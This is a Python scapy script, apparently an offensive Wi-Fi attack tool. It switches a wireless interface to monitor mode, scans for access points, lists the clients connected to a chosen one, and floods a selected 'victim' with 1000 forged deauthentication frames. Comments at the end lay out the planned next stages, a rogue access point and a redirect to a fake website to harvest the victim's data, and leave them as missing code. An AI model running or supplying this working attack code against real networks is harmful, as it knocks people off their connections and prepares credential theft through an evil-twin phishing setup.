from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11, RadioTap, Dot11Deauth
import colorama

colorama.init()


def get_connected_devices(ap_mac):
    devices = []

    # print(type(ap_mac))
    def packet_handler(packet):

        if packet.haslayer(Dot11):
            # print(colorama.Fore.YELLOW + "found normal frame :(")
            # Check if the packet is a data packet (i.e. not a beacon, probe request, etc.)
            if packet.type == 2:
                # print(colorama.Fore.GREEN+"found data frame :)"+colorama.Fore.CYAN)
                # print(packet.show())
                # Check if the source MAC address matches the AP's MAC address
                if packet.addr2 == ap_mac:
                    if packet.addr1 not in devices:
                        # Add the destination MAC address to the set of connected devices
                        devices.append(packet.addr1)

    # Start sniffing for packets
    sniff(iface=get_wireless_interface(), prn=packet_handler, timeout=10)

    # Return the set of connected devices
    return devices


def get_wireless_interface():
    interfaces = get_if_list()
    for interface in interfaces:
        if interface.startswith("wl"):
            return interface
    return None


def switch_to_monitor_mode():
    our_wlan = get_wireless_interface()
    os.system(f"ifconfig {our_wlan} down")
    os.system(f"iwconfig {our_wlan} mode monitor")
    os.system(f"ifconfig {our_wlan} up")


# Define a function to scan for beacons and extract SSIDs
def scan_for_ssids():
    ssid_list = []  # Use a set to avoid duplicates

    def handle_packet(packet: scapy.packet.Packet):
        if packet.haslayer(Dot11Beacon):
            ssid = packet[Dot11Elt].info.decode('utf-8')
            first_elements = [t[0] for t in ssid_list]
            if ssid not in first_elements:
                # ssid_list.add(ssid)
                print(f"Found SSID: {ssid}")
                # packet.show()
                # print("...............................") #for research purposes :)
                # packet.summary()
                packet_channel = packet[scapy.layers.dot11.Dot11EltDSSSet].channel
                bssid = packet[Dot11].addr2
                """
                    adding tuple of (ssid,MAC of AP, wifi channel)
                    """
                ssid_list.append((ssid, bssid, packet_channel))

    print(colorama.Fore.RED + "Scanning for beacons...")
    sniff(iface=get_wireless_interface(), prn=handle_packet, timeout=10)
    print("Beacon scanning complete!" + colorama.Fore.RESET)
    # print(ssid_list)
    return ssid_list


def print_ssid_list(ssid_list):
    print(colorama.Fore.BLUE)
    counter = 0
    for ssid in ssid_list:
        print(f"{counter})Router name: {ssid[0]} \n Router MAC: {ssid[1]} \n wifi channel: {ssid[2]} \n")
        counter += 1


def deauthenticate_victim(victim_mac, ap_mac):
    # Create a deauthentication frame with the victim's MAC address as the target
    frame = RadioTap() / Dot11(addr1=victim_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()

    # Send the deauthentication frame
    sendp(frame, iface=get_wireless_interface(), count=1000, inter=0.1)


def print_connected_devices_list(connected_devices_list):
    counter = 0
    for device in connected_devices_list:
        print(f"{counter}) {device} \n")
        counter += 1


if __name__ == '__main__':
    print(colorama.Fore.CYAN + "welcome beautiful!")
    switch_to_monitor_mode()
    ssid_list = scan_for_ssids()
    # now we ask the user to choose which ssid he is interested in ?
    print_ssid_list(ssid_list)
    choice = input("please choose the desired access point:")
    choice = int(choice)
    print(f"your desired AP is : {str(ssid_list[choice])}")
    ap_mac = ssid_list[choice][1]
    connected_devices_list = get_connected_devices(ap_mac)
    print_connected_devices_list(connected_devices_list)
    """ victim tracking down """
    choice_victim = input("please choose the desired unfortunate victim:")
    choice_victim = int(choice_victim)
    victim_mac = connected_devices_list[choice_victim]
    deauthenticate_victim(victim_mac, ap_mac) # ✅✅✅
    """ create Raouge AP & send beacons to advertise it """
    # missing code
    """ once victim connected redirect to fake website to obtain the desired data from """
    # missing code
